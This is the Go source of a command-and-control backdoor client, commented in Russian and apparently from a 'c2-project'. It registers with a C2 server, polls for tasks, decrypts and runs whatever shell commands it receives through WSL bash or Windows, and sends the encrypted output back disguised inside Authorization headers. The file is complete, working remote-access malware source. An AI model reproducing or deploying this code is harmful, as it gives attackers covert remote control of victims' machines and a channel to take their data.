// Package main - клиент (бэкдор).
// Регистрируется на C2-сервере, периодически опрашивает наличие задач,
// выполняет полученные команды и отправляет результаты обратно на сервер.
// Поддерживает переопределение client_id через аргумент -id.
package main

import (
	"bytes"
	"c2-project/internal/crypto"
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// ClientConfig - структура конфигурации клиента.
// Загружается из файла configs/client.json.
type ClientConfig struct {
	ServerURL    string `json:"server_url"`    // Адрес C2-сервера
	ClientID     string `json:"client_id"`     // Уникальный идентификатор клиента
	PollInterval int    `json:"poll_interval"` // Интервал опроса задач в секундах
}

// config - глобальная переменная с настройками клиента.
var config ClientConfig

// main - точка входа клиента.
func main() {
	// Загружаем конфигурацию из файла.
	if err := loadConfig(); err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Проверяем аргументы командной строки.
	// Использование: client.exe -id client-002
	for i := 1; i < len(os.Args); i++ {
		if os.Args[i] == "-id" && i+1 < len(os.Args) {
			config.ClientID = os.Args[i+1]
			log.Printf("[INFO] Client ID overridden to: %s", config.ClientID)
			break
		}
	}

	log.Printf("[START] Client %s starting...", config.ClientID)

	// Регистрируемся на сервере.
	registerClient()

	log.Printf("[TEST] Client %s entered main loop", config.ClientID)

	// Основной цикл: опрос задач, выполнение, отправка результатов.
	for {
		log.Printf("[TEST] Loop iteration start for %s", config.ClientID)

		task, err := pollTasks()
		if err != nil {
			log.Printf("[ERROR] Poll error: %v", err)
			time.Sleep(time.Duration(config.PollInterval) * time.Second)
			continue
		}

		// Если задач нет - ждём и продолжаем опрос.
		if task.ID == "" {
			log.Printf("[TEST] No tasks for %s, sleeping %d seconds", config.ClientID, config.PollInterval)
			time.Sleep(time.Duration(config.PollInterval) * time.Second)
			continue
		}

		// Если задача есть - выполняем.
		log.Printf("[TEST] Task received for %s: ID=%s, Command=%s", config.ClientID, task.ID, task.Command)

		// Выполняем полученную задачу.
		log.Printf("[DECRYPT] Task decrypted: %s", task.Command)
		log.Printf("[EXEC] Executing: %s", task.Command)
		output, err := executeCommand(task.Command)
		status := "completed"
		if err != nil {
			status = "failed"
			output = err.Error()
		}

		// Отправляем результат выполнения на сервер.
		sendResult(task.ID, output, status)
		time.Sleep(1 * time.Second)
	}
}

// loadConfig - загружает конфигурацию из JSON-файла configs/client.json.
func loadConfig() error {
	file, err := os.Open("configs/client.json")
	if err != nil {
		return err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	return decoder.Decode(&config)
}

// registerClient - регистрирует клиента на C2-сервере.
// Отправляет client_id в заголовке Authorization: Bearer <client_id>.
func registerClient() {
	// Создаём пустой запрос (вся информация в заголовке).
	req := map[string]interface{}{}
	jsonData, _ := json.Marshal(req)

	client := &http.Client{}
	reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/register", bytes.NewReader(jsonData))
	if err != nil {
		log.Printf("[ERROR] Registration error: %v", err)
		return
	}
	// Передаём client_id в заголовке Authorization.
	reqHTTP.Header.Set("Authorization", "Bearer "+config.ClientID)
	reqHTTP.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(reqHTTP)
	if err != nil {
		log.Printf("[ERROR] Registration error: %v", err)
		return
	}
	defer resp.Body.Close()
	log.Println("[OK] Registration successful")
}

// pollTasks - опрашивает сервер на наличие задач.
// Возвращает задачу или пустую структуру, если задач нет.
func pollTasks() (models.Task, error) {
	log.Printf("[TEST] pollTasks() called for %s", config.ClientID)

	// Создаём пустой запрос (client_id в заголовке).
	req := map[string]interface{}{}
	jsonData, _ := json.Marshal(req)

	client := &http.Client{}
	reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/poll", bytes.NewReader(jsonData))
	if err != nil {
		return models.Task{}, err
	}
	reqHTTP.Header.Set("Authorization", "Bearer "+config.ClientID)
	reqHTTP.Header.Set("Content-Type", "application/json")

	log.Printf("[TEST] Sending poll request to %s/api/poll with client_id=%s", config.ServerURL, config.ClientID)

	resp, err := client.Do(reqHTTP)
	if err != nil {
		return models.Task{}, err
	}
	defer resp.Body.Close()

	log.Printf("[TEST] Poll response status: %s", resp.Status)

	// Проверяем ответ сервера.
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	status, _ := result["status"].(string)
	log.Printf("[TEST] Poll response status field: %s", status)

	if status == "no_tasks" {
		log.Printf("[TEST] No tasks available for %s", config.ClientID)
		return models.Task{}, nil
	}

	// Извлекаем зашифрованную задачу из заголовка Authorization.
	authHeader := resp.Header.Get("Authorization")
	token := getTokenFromBearer(authHeader)
	if token == "" {
		log.Printf("[TEST] No Authorization header in poll response for %s", config.ClientID)
		return models.Task{}, nil
	}

	log.Printf("[TEST] Received encrypted task for %s", config.ClientID)

	// Расшифровываем полученную задачу.
	log.Println("[DECRYPT] Decrypting received task")
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		log.Printf("[TEST] Decryption error: %v", err)
		return models.Task{}, err
	}

	// Преобразуем данные в структуру Task.
	jsonData, _ = json.Marshal(data)
	var task models.Task
	json.Unmarshal(jsonData, &task)

	log.Printf("[TEST] Decrypted task: ID=%s, Command=%s", task.ID, task.Command)

	// Если команда была сжата - распаковываем её.
	if task.Command != "" {
		decompressed, err := crypto.Decompress([]byte(task.Command))
		if err == nil {
			task.Command = string(decompressed)
			log.Printf("[TEST] Decompressed command: %s", task.Command)
		}
	}

	return task, nil
}

// executeCommand - выполняет команду в оболочке.
// Сначала пытается выполнить через WSL (для Linux-команд),
// при ошибке - выполняет как Windows-команду через CMD.
// Если результат длиннее 5000 байт - сжимает его.
func executeCommand(cmd string) (string, error) {
	// Разбиваем команду на аргументы для проверки.
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return "", fmt.Errorf("empty command")
	}

	// Пытаемся выполнить через WSL (поддержка Linux-команд).
	wslCmd := exec.Command("wsl", "bash", "-c", cmd)
	output, err := wslCmd.CombinedOutput()

	// Если WSL недоступен - выполняем как Windows-команду.
	if err != nil {
		var execCmd *exec.Cmd
		if len(parts) == 1 {
			execCmd = exec.Command(parts[0])
		} else {
			execCmd = exec.Command(parts[0], parts[1:]...)
		}
		output, err = execCmd.CombinedOutput()
		if err != nil {
			return string(output), err
		}
	}

	// Сжимаем результат только если он длинный (> 5000 байт).
	if len(output) > 5000 {
		compressed, err := crypto.Compress(output)
		if err == nil {
			return string(compressed), nil
		}
	}
	return string(output), nil
}

// sendResult - отправляет результат выполнения на сервер.
// Шифрует результат и передаёт в заголовке Authorization: Bearer <token>.
func sendResult(taskID, output, status string) {
	log.Printf("[ENCRYPT] Encrypting result for task %s", taskID)

	// Формируем результат.
	result := map[string]interface{}{
		"task_id": taskID,
		"output":  output,
		"status":  status,
	}

	// Шифруем результат.
	token, err := protocol.EncodeRequest(result)
	if err != nil {
		log.Printf("[ERROR] Failed to encode result: %v", err)
		return
	}

	// Создаём HTTP-запрос с пустым телом.
	jsonData, _ := json.Marshal(map[string]interface{}{})

	client := &http.Client{}
	reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/results", bytes.NewReader(jsonData))
	if err != nil {
		log.Printf("[ERROR] Failed to send result: %v", err)
		return
	}
	// Передаём зашифрованный результат в заголовке Authorization.
	reqHTTP.Header.Set("Authorization", "Bearer "+token)
	reqHTTP.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(reqHTTP)
	if err != nil {
		log.Printf("[ERROR] Failed to send result: %v", err)
		return
	}
	defer resp.Body.Close()

	log.Printf("[SEND] Encrypted result sent to server")
}

// getTokenFromBearer - извлекает токен из заголовка Authorization.
// Ожидает формат: "Bearer <token>".
func getTokenFromBearer(authHeader string) string {
	parts := strings.SplitN(authHeader, " ", 2)
	if len(parts) != 2 || parts[0] != "Bearer" {
		return ""
	}
	return parts[1]
}
